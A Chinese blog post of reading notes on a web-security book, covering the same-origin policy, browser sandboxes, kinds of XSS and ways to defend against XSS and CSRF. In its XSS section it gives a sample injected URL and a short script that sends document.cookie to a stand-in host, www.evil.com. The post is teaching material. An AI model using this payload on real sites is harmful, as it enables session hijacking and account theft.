<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="记录生活点滴"><title>白帽子讲web安全-阅读笔记 | 菜鸟の日常</title><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/5.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.0/grids-responsive-min.css"><link rel="stylesheet" type="text/css" href="/MyBlog/css/style.css?v=0.0.0"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/MyBlog/favicon.ico"><link rel="apple-touch-icon" href="/MyBlog/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/MyBlog/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">白帽子讲web安全-阅读笔记</h1><a id="logo" href="/MyBlog/.">菜鸟の日常</a><p class="description">呆到深处自然萌~</p></div><div id="nav-menu"><a href="/MyBlog/." class="current"><i class="fa fa-home"> 首页</i></a><a href="/MyBlog/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/MyBlog/about/"><i class="fa fa-user"> 关于</i></a><a href="/MyBlog/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">白帽子讲web安全-阅读笔记</h1><div class="post-meta">Jun 14, 2017<span> | </span><span class="category"><a href="/MyBlog/categories/web安全/">web安全</a></span><script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><div class="clear"><div id="toc" class="toc-article"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#第二篇-客户端脚本安全"><span class="toc-number">1.</span> <span class="toc-text">第二篇 客户端脚本安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#浏览器安全"><span class="toc-number">1.1.</span> <span class="toc-text">浏览器安全</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#同源策略"><span class="toc-number">1.1.1.</span> <span class="toc-text">同源策略</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#浏览器沙箱"><span class="toc-number">1.1.2.</span> <span class="toc-text">浏览器沙箱</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第3章-跨站脚本攻击（XSS）"><span class="toc-number">1.2.</span> <span class="toc-text">第3章 跨站脚本攻击（XSS）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS简介"><span class="toc-number">1.2.1.</span> <span class="toc-text">XSS简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS攻击进阶"><span class="toc-number">1.2.2.</span> <span class="toc-text">XSS攻击进阶</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第4章-跨站点请求伪造（CSRF）"><span class="toc-number">1.3.</span> <span class="toc-text">第4章 跨站点请求伪造（CSRF）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CSRF简介"><span class="toc-number">1.3.1.</span> <span class="toc-text">CSRF简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CSRF进阶"><span class="toc-number">1.3.2.</span> <span class="toc-text">CSRF进阶</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CSRF防御"><span class="toc-number">1.3.3.</span> <span class="toc-text">CSRF防御</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#持续更新中。。。"><span class="toc-number">2.</span> <span class="toc-text">持续更新中。。。</span></a></li></ol></div></div><div class="post-content"><h2 id="第二篇-客户端脚本安全"><a href="#第二篇-客户端脚本安全" class="headerlink" title="第二篇 客户端脚本安全"></a>第二篇 客户端脚本安全</h2><h3 id="浏览器安全"><a href="#浏览器安全" class="headerlink" title="浏览器安全"></a>浏览器安全</h3><h4 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h4><p><strong>浏览器的通关侧略，限制了来自不同源的“document”或脚本，对当前“document”读取或设置某些属性</strong></p>
<h4 id="浏览器沙箱"><a href="#浏览器沙箱" class="headerlink" title="浏览器沙箱"></a>浏览器沙箱</h4><p>chrome是第一个采取多进程架构的浏览器。google chrome的主要进程分为：浏览器进程、渲染进程、插件进程、扩展进程。其中渲染引擎由Sandbox隔离。</p>
<h3 id="第3章-跨站脚本攻击（XSS）"><a href="#第3章-跨站脚本攻击（XSS）" class="headerlink" title="第3章 跨站脚本攻击（XSS）"></a>第3章 跨站脚本攻击（XSS）</h3><h4 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h4><p>XSS根据效果不同可以分为以下几类：</p>
<ol>
<li>反射性XSS：简单的把用户输入的数据“反射”给浏览器，黑客需要诱使用户“点击”一个恶意链接，才能成功。也叫“非持久性XSS”。</li>
<li>存储型XSS：会把用户输入的数据存储至服务端，这种XSS具有很强的稳定性。场景：黑客写了一篇带有恶意js脚本的博客进行发表，之后所有访问该博客文章的用户，都会在浏览器中执行这个js代码。也叫“持久型XSS”。</li>
<li>DOM Based XSS：从效果来说也是“反射型”的，通过修改页面的DOM节点形成的XSS。</li>
</ol>
<h4 id="XSS攻击进阶"><a href="#XSS攻击进阶" class="headerlink" title="XSS攻击进阶"></a>XSS攻击进阶</h4><ol>
<li><p>初探XSS Payload</p>
<p> XSS攻击成功后，攻击者能够对用户单前浏览的页面植入恶意脚本，通过恶意脚本，控制用户浏览器。这些泳衣完成各种具体功能的恶意脚本，被称为“XSS payload”。</p>
<p> XSS Payload实际上就是js脚本（还可以是Flash或其他富客户端的脚本）</p>
<p> 一个小例子——cookie劫持：<br> 攻击者在URL中输入<br> <code>http://www.a.com/test.htm?abc=&quot;&gt;&lt;script src=http://www.evil.com/evil.js &gt;&lt;/script&gt;</code></p>
<p> 真正的XSS Payload写在这个远程脚本中，避免直接在URL的参数里写入大量的JavaScript代码。</p>
<p> <code>evil.js</code>中的内容如下：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</div><div class="line">img.src = <span class="string">"http://www.evil.com/log?"</span> + <span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</div><div class="line"><span class="built_in">document</span>.body.appendChild(img);</div></pre></td></tr></table></figure>
<p> 这段代码在页面中插入了一个看不到的图片，同时把<code>document.cookie</code>对象作为参数发送到远程服务器。</p>
</li>
<li><p>强大的XSS Payload</p>
<p> 。。。。。</p>
</li>
<li><p>XSS的防御</p>
<ul>
<li>HttpOnly</li>
<li>输入检查：<br><code>&lt;</code>、<code>&gt;</code>、<code>&#39;</code>、<code>&quot;</code>等</li>
<li>输出检查<ul>
<li>安全的编码函数<br><code>&lt;</code>、<code>&gt;</code>、<code>&#39;</code>、<code>&quot;</code>、<code>/</code>、<code>&amp;</code>等</li>
</ul>
</li>
<li>正确防御XSS：XSS的本质是一种“HTML注入”： HtmlEncode、HtmlEntities、JavascriptEncode、OWASP ESAPI encodeForCSS、URLEncode</li>
<li>处理富文本：网站允许用户提交一些自定义的HTML代码，称之为“富文本”，禁止一些危险的标签。</li>
<li>防御DOM BASED XSS：js输出到HTML，也相当于一次XSS 的输出过程。分情况通过编码的方式解决。了解js输出到HTML的途径。</li>
</ul>
</li>
</ol>
<h3 id="第4章-跨站点请求伪造（CSRF）"><a href="#第4章-跨站点请求伪造（CSRF）" class="headerlink" title="第4章 跨站点请求伪造（CSRF）"></a>第4章 跨站点请求伪造（CSRF）</h3><h4 id="CSRF简介"><a href="#CSRF简介" class="headerlink" title="CSRF简介"></a>CSRF简介</h4><h4 id="CSRF进阶"><a href="#CSRF进阶" class="headerlink" title="CSRF进阶"></a>CSRF进阶</h4><h4 id="CSRF防御"><a href="#CSRF防御" class="headerlink" title="CSRF防御"></a>CSRF防御</h4><ol>
<li>验证码：CSRF攻击的过程，往往是在用户不知情的情况下构造了网络请求，验证码需要用户的交互才能完成</li>
<li>referer check: 检查请求是否来自于合法的“源”。但是服务器并非什么时候都能取到referer。</li>
<li>Anti CSRF Token<br> CSRF能够攻击成功的原因是：重要操作的所有参数都是可以被攻击者猜测到的。<br> 如果参数无法被攻击者猜到，如username为添加token后的MD5的值，而token是一个秘密，被用户和浏览器所共同持有，不被第三者直销。token可以放到session、浏览器的cookie中。token需要根据“不可预测性原则”设计，其生成一定要够随机。</li>
</ol>
<h2 id="持续更新中。。。"><a href="#持续更新中。。。" class="headerlink" title="持续更新中。。。"></a>持续更新中。。。</h2></div><script type="text/javascript" src="/MyBlog/js/share.js?v=0.0.0" async></script><a data-url="http://mayfeelyang.github.io/MyBlog/2017/06/14/白帽子讲web安全-阅读笔记/" data-id="cj3x0nr0c0012kwc0v8qppu16" class="article-share-link">分享到</a><div class="tags"><a href="/MyBlog/tags/web/">web</a><a href="/MyBlog/tags/xss-csrf/">xss - csrf</a></div><div class="post-nav"><a href="/MyBlog/2017/06/14/peach监控/" class="pre"></a><a href="/MyBlog/2017/06/14/Jhead-3-00-Heap-Buffer-Overflow-Vulnerability-2/" class="next">Jhead-3.00 Heap Buffer Overflow Vulnerability-2</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/MyBlog/categories/CTF相关/">CTF相关</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/MyBlog/categories/Preparation-编程基础/">Preparation - 编程基础</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/MyBlog/categories/web安全/">web安全</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/MyBlog/categories/模式识别/">模式识别</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/MyBlog/categories/模糊测试/">模糊测试</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/MyBlog/categories/漏洞分析/">漏洞分析</a><span class="category-list-count">4</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/MyBlog/tags/symbolic-analysis/" style="font-size: 15px;">symbolic analysis</a> <a href="/MyBlog/tags/ELF/" style="font-size: 15px;">ELF</a> <a href="/MyBlog/tags/driller/" style="font-size: 15px;">driller</a> <a href="/MyBlog/tags/symbolic-execution/" style="font-size: 15px;">symbolic execution</a> <a href="/MyBlog/tags/crash/" style="font-size: 15px;">crash</a> <a href="/MyBlog/tags/heap-buffer-overflow/" style="font-size: 15px;">heap buffer overflow</a> <a href="/MyBlog/tags/IDA/" style="font-size: 15px;">IDA</a> <a href="/MyBlog/tags/C/" style="font-size: 15px;">C++</a> <a href="/MyBlog/tags/null-pointer-dereference/" style="font-size: 15px;">null pointer dereference</a> <a href="/MyBlog/tags/symfuzz/" style="font-size: 15px;">symfuzz</a> <a href="/MyBlog/tags/fuzz/" style="font-size: 15px;">fuzz</a> <a href="/MyBlog/tags/BAP/" style="font-size: 15px;">BAP</a> <a href="/MyBlog/tags/markdown/" style="font-size: 15px;">markdown</a> <a href="/MyBlog/tags/oss/" style="font-size: 15px;">oss</a> <a href="/MyBlog/tags/zzuf/" style="font-size: 15px;">zzuf</a> <a href="/MyBlog/tags/web/" style="font-size: 15px;">web</a> <a href="/MyBlog/tags/xss-csrf/" style="font-size: 15px;">xss - csrf</a> <a href="/MyBlog/tags/sulley/" style="font-size: 15px;">sulley</a> <a href="/MyBlog/tags/模式识别/" style="font-size: 15px;">模式识别</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最新文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/MyBlog/2017/06/14/peach监控/">peach监控</a></li><li class="post-list-item"><a class="post-list-link" href="/MyBlog/2017/06/14/白帽子讲web安全-阅读笔记/">白帽子讲web安全-阅读笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/MyBlog/2017/06/14/Jhead-3-00-Heap-Buffer-Overflow-Vulnerability-2/">Jhead-3.00 Heap Buffer Overflow Vulnerability-2</a></li><li class="post-list-item"><a class="post-list-link" href="/MyBlog/2017/06/01/Jhead-3-00-Heap-Buffer-Overflow-Vulnerability/">Jhead-3.00 Heap Buffer Overflow Vulnerability-1</a></li><li class="post-list-item"><a class="post-list-link" href="/MyBlog/2017/04/10/zzuf原理及源码分析/">zzuf原理及源码分析</a></li><li class="post-list-item"><a class="post-list-link" href="/MyBlog/2017/02/14/Fuzz/sulley的架构/">sulley的架构</a></li><li class="post-list-item"><a class="post-list-link" href="/MyBlog/2017/01/30/Libbpg-0-9-7-bpgenc-Null-Pointer-Dereference/">Libbpg-0.9.7 (bpgenc) Null Pointer Dereference</a></li><li class="post-list-item"><a class="post-list-link" href="/MyBlog/2017/01/14/Libbpg-0-9-7-bpgdec-Heap-Buffer-Overflow-Vulnerability/">Libbpg-0.9.7 (bpgdec) Heap Buffer Overflow Vulnerability</a></li><li class="post-list-item"><a class="post-list-link" href="/MyBlog/2017/01/11/PatternRecognition&MachineLearning/几种常见模式识别算法的整理和总结/">几种常见模式识别算法的整理和总结</a></li><li class="post-list-item"><a class="post-list-link" href="/MyBlog/2016/12/23/IDA学习笔记-1/">IDA学习笔记(1)</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">© <a href="/MyBlog/." rel="nofollow">菜鸟の日常.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/MyBlog/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js" async></script><script type="text/javascript" src="/MyBlog/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="/MyBlog/css/jquery.fancybox.css?v=0.0.0"><script type="text/javascript" src="/MyBlog/js/search.js?v=0.0.0"></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
   search_path = 'search.xml';
}
var path = '/MyBlog/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="/MyBlog/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/MyBlog/js/smartresize.js?v=0.0.0"></script></div></body></html>